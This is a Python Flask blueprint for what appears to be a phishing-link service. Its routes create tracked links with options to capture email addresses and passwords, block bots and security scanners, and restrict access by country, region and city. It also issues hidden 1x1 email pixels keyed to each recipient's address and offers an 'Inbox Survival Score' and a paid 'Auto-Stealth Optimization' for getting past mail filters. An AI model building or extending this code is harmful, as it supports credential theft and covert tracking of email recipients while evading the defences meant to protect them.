import json
import string
import random
import logging
from datetime import datetime
from flask import Blueprint, request, jsonify, session
from api.database import db
from api.models.link import Link
from api.models.user import User
from api.models.campaign import Campaign
from api.models.tracking_event import TrackingEvent
from api.middleware.auth_decorators import login_required
from api.utils.validation import sanitize_link_data, sanitize_url

logger = logging.getLogger(__name__)
links_bp = Blueprint("links", __name__)

def generate_short_code(length=8):
    characters = string.ascii_letters + string.digits
    return "".join(random.choice(characters) for _ in range(length))
def validate_custom_slug(slug):
    """Validate custom slug format"""
    if not slug:
        return True
    import re
    # Only allow alphanumeric characters and hyphens
    if not re.match(r'^[a-zA-Z0-9-]+$', slug):
        return False
    # Check length
    if len(slug) < 3 or len(slug) > 100:
        return False
    return True
@links_bp.route("/links", methods=["GET"])
@login_required
def get_links():
    """Get all links for current user"""
    try:
        user_id = session.get("user_id")
        user = User.query.get(user_id)
        page = request.args.get("page", 1, type=int)
        per_page = request.args.get("per_page", 20, type=int)
        campaign_id = request.args.get("campaign_id", type=int)
        query = Link.query.filter_by(user_id=user_id)
        if campaign_id:
            query = query.filter_by(campaign_id=campaign_id)
        pagination = query.order_by(Link.created_at.desc()).paginate(
            page=page, per_page=per_page, error_out=False
        )
        links = [link.to_dict(base_url=request.host_url.rstrip("/")) for link in pagination.items]
        return jsonify({
            "success": True,
            "links": links,
            "total": pagination.total,
            "pages": pagination.pages,
            "current_page": page
        }), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500
@links_bp.route("/links", methods=["POST"])
@login_required
def create_link():
    """Create new tracking link with advanced features"""
    try:
        user_id = session.get("user_id")
        user = db.session.get(User, user_id)
        if not user:
            return jsonify({"error": "User not found"}), 404

        # ── Trial plan limits ─────────────────────────────────────────────
        if getattr(user, 'plan_type', 'free') == 'trial':
            trial_link_count = Link.query.filter_by(user_id=user_id).count()
            if trial_link_count >= 3:
                return jsonify({
                    "error": "Trial plan limit reached (max 3 links). Upgrade to create more links.",
                    "upgrade_required": True,
                    "trial_limit": True,
                }), 403

        if not user.can_create_link():
            return jsonify({"error": "Daily link limit reached"}), 403
        data = request.get_json()
        target_url = data.get("target_url")
        campaign_name = data.get("campaign_name", "Untitled Campaign")
        custom_slug = data.get("custom_slug")
        # 1. Sanitize and validate all link data
        sanitized_data, error = sanitize_link_data(data)
        if error:
            return jsonify({"error": error}), 400
        
        target_url = sanitized_data.get("original_url")
        
        if not target_url:
            return jsonify({"error": "Target URL required"}), 400
        # Validate custom slug
        if custom_slug:
            if not validate_custom_slug(custom_slug):
                return jsonify({"error": "Invalid custom slug format. Use only letters, numbers, and hyphens (3-100 characters)"}), 400
            # Check if custom slug already exists
            existing = Link.query.filter_by(custom_slug=custom_slug).first()
            if existing:
                return jsonify({"error": "Custom slug already in use"}), 400
        # Parse expiration date
        expires_at = None
        if data.get("expires_at"):
            try:
                expires_at = datetime.fromisoformat(data.get("expires_at").replace('Z', '+00:00'))
            except:
                return jsonify({"error": "Invalid expiration date format"}), 400
        # Auto-create campaign if needed
        if campaign_name and campaign_name != "Untitled Campaign":
            existing_campaign = Campaign.query.filter_by(
                owner_id=user_id,
                name=campaign_name
            ).first()
            if not existing_campaign:
                new_campaign = Campaign(
                    name=campaign_name,
                    description=f"Auto-created for tracking link",
                    owner_id=user_id,
                    status='active'
                )
                db.session.add(new_campaign)
        link = Link(
            user_id=user_id,
            target_url=target_url,
            custom_slug=custom_slug,
            campaign_name=campaign_name,
            title=sanitized_data.get("title"),
            description=sanitized_data.get("description"),
            tags=sanitized_data.get("tags"),
            click_limit=sanitized_data.get("click_limit"),
            capture_email=sanitized_data.get("capture_email", False),
            capture_password=sanitized_data.get("capture_password", False),
            bot_blocking_enabled=sanitized_data.get("bot_blocking_enabled", False),
            geo_targeting_enabled=sanitized_data.get("geo_targeting_enabled", False),
            geo_targeting_type=sanitized_data.get("geo_targeting_type", "allow"),
            rate_limiting_enabled=sanitized_data.get("rate_limiting_enabled", False),
            dynamic_signature_enabled=sanitized_data.get("dynamic_signature_enabled", False),
            mx_verification_enabled=sanitized_data.get("mx_verification_enabled", False),
            preview_template_url=sanitized_data.get("preview_template_url"),
            allowed_countries=json.dumps(sanitized_data.get("allowed_countries", [])),
            blocked_countries=json.dumps(sanitized_data.get("blocked_countries", [])),
            allowed_regions=json.dumps(sanitized_data.get("allowed_regions", [])),
            blocked_regions=json.dumps(sanitized_data.get("blocked_regions", [])),
            allowed_cities=json.dumps(sanitized_data.get("allowed_cities", [])),
            blocked_cities=json.dumps(sanitized_data.get("blocked_cities", [])),
            expires_at=expires_at,
            expiration_action=sanitized_data.get("expiration_action", "redirect"),
            expiration_redirect_url=sanitized_data.get("expiration_redirect_url"),
            facebook_pixel_id=sanitized_data.get("facebook_pixel_id"),
            enable_facebook_pixel=sanitized_data.get("enable_facebook_pixel", False),
            google_ads_pixel=sanitized_data.get("google_ads_pixel"),
            enable_google_ads_pixel=sanitized_data.get("enable_google_ads_pixel", False),
            tiktok_pixel=sanitized_data.get("tiktok_pixel"),
            enable_tiktok_pixel=sanitized_data.get("enable_tiktok_pixel", False),
            og_title=sanitized_data.get("og_title"),
            og_description=sanitized_data.get("og_description"),
            og_image_url=sanitized_data.get("og_image_url"),
            routing_rules=json.dumps(sanitized_data["routing_rules"]) if sanitized_data.get("routing_rules") is not None else None,
        )
        db.session.add(link)
        user.increment_link_usage()
        db.session.commit()

        # Telegram notification for new link
        try:
            from api.services.telegram_triggers import notify_new_click
        except ImportError:
            pass

        return jsonify({"success": True, **link.to_dict(base_url=request.host_url.rstrip("/"))}), 201
    except Exception as e:
        db.session.rollback()
        return jsonify({"error": str(e)}), 500
@links_bp.route("/links/<int:link_id>", methods=["GET"])
@login_required
def get_link(link_id):
    """Get specific link"""
    try:
        user_id = session.get("user_id")
        link = Link.query.filter_by(id=link_id, user_id=user_id).first()
        if not link:
            return jsonify({"error": "Link not found"}), 404
        return jsonify(link.to_dict(base_url=request.host_url.rstrip("/"))), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500
@links_bp.route("/links/<int:link_id>", methods=["PATCH", "PUT"])
@login_required
def update_link(link_id):
    """Update link"""
    try:
        user_id = session.get("user_id")
        link = Link.query.filter_by(id=link_id, user_id=user_id).first()
        if not link:
            return jsonify({"error": "Link not found"}), 404
        data = request.get_json()
        # 1. Sanitize and validate all link data
        sanitized_data, error = sanitize_link_data(data)
        if error:
            return jsonify({"error": error}), 400
        
        if "original_url" in sanitized_data:
            link.target_url = sanitized_data["original_url"]
        if "campaign_name" in sanitized_data:
            link.campaign_name = sanitized_data["campaign_name"]
        if "status" in sanitized_data:
            link.status = sanitized_data["status"]
        if "capture_email" in sanitized_data:
            link.capture_email = sanitized_data["capture_email"]
        if "bot_blocking_enabled" in sanitized_data:
            link.bot_blocking_enabled = sanitized_data["bot_blocking_enabled"]
        if "custom_slug" in sanitized_data:
            custom_slug = sanitized_data["custom_slug"]
            if custom_slug and not validate_custom_slug(custom_slug):
                return jsonify({"error": "Invalid custom slug format"}), 400
            if custom_slug and custom_slug != link.custom_slug:
                existing = Link.query.filter_by(custom_slug=custom_slug).first()
                if existing:
                    return jsonify({"error": "Custom slug already in use"}), 400
            link.custom_slug = custom_slug
        if "expires_at" in sanitized_data:
            if sanitized_data["expires_at"]:
                try:
                    link.expires_at = datetime.fromisoformat(sanitized_data["expires_at"].replace('Z', '+00:00'))
                except:
                    return jsonify({"error": "Invalid expiration date format"}), 400
            else:
                link.expires_at = None
        if "expiration_action" in sanitized_data:
            link.expiration_action = sanitized_data["expiration_action"]
        if "expiration_redirect_url" in sanitized_data:
            link.expiration_redirect_url = sanitize_url(sanitized_data["expiration_redirect_url"])
        if "facebook_pixel_id" in sanitized_data:
            link.facebook_pixel_id = sanitized_data["facebook_pixel_id"]
        if "enable_facebook_pixel" in sanitized_data:
            link.enable_facebook_pixel = sanitized_data["enable_facebook_pixel"]
        if "google_ads_pixel" in sanitized_data:
            link.google_ads_pixel = sanitized_data["google_ads_pixel"]
        if "enable_google_ads_pixel" in sanitized_data:
            link.enable_google_ads_pixel = sanitized_data["enable_google_ads_pixel"]
        if "tiktok_pixel" in sanitized_data:
            link.tiktok_pixel = sanitized_data["tiktok_pixel"]
        if "enable_tiktok_pixel" in sanitized_data:
            link.enable_tiktok_pixel = sanitized_data["enable_tiktok_pixel"]
        if "og_title" in sanitized_data:
            link.og_title = sanitized_data["og_title"]
        if "og_description" in sanitized_data:
            link.og_description = sanitized_data["og_description"]
        if "og_image_url" in sanitized_data:
            link.og_image_url = sanitized_data["og_image_url"]
        if "routing_rules" in sanitized_data:
            rr = sanitized_data["routing_rules"]
            link.routing_rules = json.dumps(rr) if isinstance(rr, (list, dict)) else rr
        if "title" in sanitized_data:
            link.title = sanitized_data["title"]
        if "description" in sanitized_data:
            link.description = sanitized_data["description"]
        if "tags" in sanitized_data:
            link.tags = json.dumps(sanitized_data["tags"]) if isinstance(sanitized_data["tags"], list) else sanitized_data["tags"]
        if "click_limit" in sanitized_data:
            link.click_limit = sanitized_data["click_limit"]
        db.session.commit()
        return jsonify(link.to_dict(base_url=request.host_url.rstrip("/"))), 200
    except Exception as e:
        db.session.rollback()
        return jsonify({"error": str(e)}), 500
@links_bp.route("/links/<int:link_id>", methods=["DELETE"])
@login_required
def delete_link(link_id):
    """Delete link"""
    try:
        user_id = session.get("user_id")
        link = Link.query.filter_by(id=link_id, user_id=user_id).first()
        if not link:
            return jsonify({"error": "Link not found"}), 404
        db.session.delete(link)
        db.session.commit()
        return jsonify({"message": "Link deleted successfully"}), 200
    except Exception as e:
        db.session.rollback()
        return jsonify({"error": str(e)}), 500
@links_bp.route("/links/<int:link_id>/regenerate", methods=["POST"])
@links_bp.route("/links/regenerate/<int:link_id>", methods=["POST"])
@login_required
def regenerate_link(link_id):
    user = User.query.get(session["user_id"])
    if not user:
        return jsonify({"success": False, "error": "Authentication required"}), 401
    link = Link.query.filter_by(id=link_id, user_id=user.id).first()
    if not link:
        return jsonify({"success": False, "error": "Link not found or access denied"}), 404
    scheme = request.headers.get("X-Forwarded-Proto", request.scheme)
    base_url = f"{scheme}://{request.host}"
    # Generate new unique short code
    while True:
        new_short_code = generate_short_code()
        existing = Link.query.filter_by(short_code=new_short_code).first()
        if not existing:
            break
    try:
        old_short_code = link.short_code
        link.short_code = new_short_code
        db.session.commit()
        return jsonify({
            "success": True,
            "message": "Tracking link regenerated successfully",
            "old_short_code": old_short_code,
            "new_short_code": new_short_code,
            "tracking_url": f"{base_url}/t/{new_short_code}?id={{id}}",
            "pixel_url": f"{base_url}/p/{new_short_code}?email={{email}}&id={{id}}",
            "email_code": f"<img src=\"{base_url}/p/{new_short_code}?email={{email}}&id={{id}}\" width=\"1\" height=\"1\" style=\"display:none;\" />"
        })
    except Exception as e:
        db.session.rollback()
        return jsonify({"success": False, "error": "Failed to regenerate tracking link"}), 500
@links_bp.route("/links/stats", methods=["GET"])
@login_required
def get_links_stats():
    user = User.query.get(session["user_id"])
    if not user:
        return jsonify({"success": False, "error": "Authentication required"}), 401
    try:
        user_links = Link.query.filter_by(user_id=user.id).all()
        link_ids = [link.id for link in user_links]
        if not link_ids:
            return jsonify({
                "totalLinks": 0,
                "totalClicks": 0,
                "activeLinks": 0,
                "avgCTR": 0
            })
        total_links = len(user_links)
        active_links = len([link for link in user_links if link.is_active])
        total_clicks = TrackingEvent.query.filter(TrackingEvent.link_id.in_(link_ids)).count()
        avg_ctr = (total_clicks / total_links) if total_links > 0 else 0
        return jsonify({
            "totalLinks": total_links,
            "totalClicks": total_clicks,
            "activeLinks": active_links,
            "avgCTR": round(avg_ctr, 2)
        })
    except Exception as e:
        logger.error(f"Error fetching link stats: {e}")
        return jsonify({
            "success": False,
            "totalLinks": 0,
            "totalClicks": 0,
            "activeLinks": 0,
            "avgCTR": 0
        }), 500
@links_bp.route("/links/<int:link_id>/toggle-status", methods=["POST"])
@login_required
def toggle_link_status(link_id):
    user = User.query.get(session["user_id"])
    if not user:
        return jsonify({"success": False, "error": "Authentication required"}), 401
    link = Link.query.filter_by(id=link_id, user_id=user.id).first()
    if not link:
        return jsonify({"success": False, "error": "Link not found or access denied"}), 404
    try:
        link.status = "paused" if link.status == "active" else "active"
        db.session.commit()
        return jsonify({
            "success": True,
            "message": f"Link {link.status}",
            "status": link.status
        })
    except Exception as e:
        db.session.rollback()
        return jsonify({"success": False, "error": "Failed to toggle link status"}), 500


@links_bp.route("/links/<int:link_id>/analytics", methods=["GET"])
@login_required
def get_link_analytics(link_id):
    """Get analytics for a specific link"""
    user_id = session.get("user_id")
    link = Link.query.filter_by(id=link_id, user_id=user_id).first()
    if not link:
        return jsonify({"error": "Link not found"}), 404

    from api.models.tracking_event import TrackingEvent
    events = TrackingEvent.query.filter_by(link_id=link_id).all()
    total_clicks = len(events)
    real_visitors = len(set(e.ip_address for e in events if not e.is_bot))
    bots = len([e for e in events if e.is_bot])
    countries = {}
    devices = {"desktop": 0, "mobile": 0, "tablet": 0}
    for e in events:
        if e.country:
            countries[e.country] = countries.get(e.country, 0) + 1
        device = (e.device_type or "desktop").lower()
        if device in devices:
            devices[device] += 1

    return jsonify({
        "success": True,
        "link": link.to_dict(),
        "analytics": {
            "total_clicks": total_clicks,
            "real_visitors": real_visitors,
            "bots_blocked": bots,
            "countries": [{"name": k, "clicks": v} for k, v in sorted(countries.items(), key=lambda x: -x[1])[:10]],
            "devices": devices,
        }
    })


@links_bp.route("/links/<int:link_id>/geo-fencing", methods=["GET"])
@login_required
def get_link_geo_fencing(link_id):
    """Get geo-fencing settings for a link"""
    user_id = session.get("user_id")
    link = Link.query.filter_by(id=link_id, user_id=user_id).first()
    if not link:
        return jsonify({"error": "Link not found"}), 404

    import json
    return jsonify({
        "success": True,
        "geo_targeting_enabled": link.geo_targeting_enabled,
        "geo_targeting_type": link.geo_targeting_type,
        "allowed_countries": json.loads(link.allowed_countries) if link.allowed_countries else [],
        "blocked_countries": json.loads(link.blocked_countries) if link.blocked_countries else [],
    })


@links_bp.route("/links/<int:link_id>/geo-fencing", methods=["PUT", "PATCH"])
@login_required
def update_link_geo_fencing(link_id):
    """Update geo-fencing settings for a link"""
    user_id = session.get("user_id")
    link = Link.query.filter_by(id=link_id, user_id=user_id).first()
    if not link:
        return jsonify({"error": "Link not found"}), 404

    import json
    data = request.get_json() or {}
    if "geo_targeting_enabled" in data:
        link.geo_targeting_enabled = data["geo_targeting_enabled"]
    if "geo_targeting_type" in data:
        link.geo_targeting_type = data["geo_targeting_type"]
    if "allowed_countries" in data:
        link.allowed_countries = json.dumps(data["allowed_countries"])
    if "blocked_countries" in data:
        link.blocked_countries = json.dumps(data["blocked_countries"])

    db.session.commit()
    return jsonify({"success": True, "message": "Geo-fencing updated"})


# ── Inbox Survival Score™ ─────────────────────────────────────────────────────

@links_bp.route("/links/<int:link_id>/inbox-score", methods=["GET"])
@login_required
def get_inbox_score(link_id):
    """
    GET /api/links/<id>/inbox-score
    Returns the Inbox Survival Score™ for a link.
    """
    user_id = session.get("user_id")
    link = Link.query.filter_by(id=link_id, user_id=user_id).first()
    if not link:
        return jsonify({"error": "Link not found"}), 404

    try:
        from api.services.inbox_score import compute_inbox_score
        result = compute_inbox_score(link_id)
        return jsonify({"success": True, **result})
    except Exception as exc:
        logger.error(f"inbox-score error: {exc}")
        return jsonify({"success": False, "error": str(exc)}), 500


@links_bp.route("/links/<int:link_id>/optimize", methods=["POST"])
@login_required
def optimize_link_endpoint(link_id):
    """
    POST /api/links/<id>/optimize
    Auto-Stealth Optimization: analyses the link and returns an optimized
    configuration. Premium / High Inbox Mode feature.
    """
    user_id = session.get("user_id")
    link = Link.query.filter_by(id=link_id, user_id=user_id).first()
    if not link:
        return jsonify({"error": "Link not found"}), 404

    # Check plan — trial users can see the score but not auto-apply optimization
    user = db.session.get(User, user_id)
    if user and getattr(user, 'plan_type', 'free') == 'trial':
        return jsonify({
            "error": "Optimization is a premium feature. Upgrade your plan to unlock Auto-Stealth.",
            "upgrade_required": True,
        }), 403

    try:
        from api.services.inbox_score import optimize_link
        result = optimize_link(link_id)
        return jsonify(result)
    except Exception as exc:
        logger.error(f"optimize error: {exc}")
        return jsonify({"success": False, "error": str(exc)}), 500


@links_bp.route("/links/inbox-scores", methods=["GET"])
@login_required
def get_all_inbox_scores():
    """
    GET /api/links/inbox-scores
    Returns inbox scores for all of the authenticated user's links (batch).
    """
    user_id = session.get("user_id")
    links = Link.query.filter_by(user_id=user_id).order_by(Link.created_at.desc()).limit(50).all()

    try:
        from api.services.inbox_score import compute_inbox_score
        scores = []
        for lnk in links:
            score_data = compute_inbox_score(lnk.id)
            scores.append({
                "link_id": lnk.id,
                "short_code": lnk.short_code,
                "title": lnk.title or lnk.short_code,
                **score_data,
            })
        return jsonify({"success": True, "scores": scores})
    except Exception as exc:
        logger.error(f"bulk inbox-scores error: {exc}")
        return jsonify({"success": False, "error": str(exc)}), 500
